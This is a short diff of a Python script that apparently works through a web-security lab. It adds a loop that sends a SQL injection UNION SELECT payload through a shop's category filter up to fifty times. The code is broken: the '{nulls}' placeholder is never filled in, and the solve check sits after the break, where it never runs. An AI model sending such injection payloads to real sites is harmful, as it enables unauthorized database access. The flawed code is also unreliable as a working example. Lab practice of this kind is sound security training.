@@ -21,9 +21,13 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def main(args):
     shop = Shop()
-    filter_path = "filter?category=' UNION SELECT {nulls}-- "
-    requests.get(base_url)
-
+    count = 1;
+    for i in range(1,51):
+        filter_path = "filter?category=' UNION SELECT {nulls}-- "
+        response = requests.get(shop.base_url + filter_path)
+        if response.status_code == 200:
+            break
+            shop.is_solved()
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
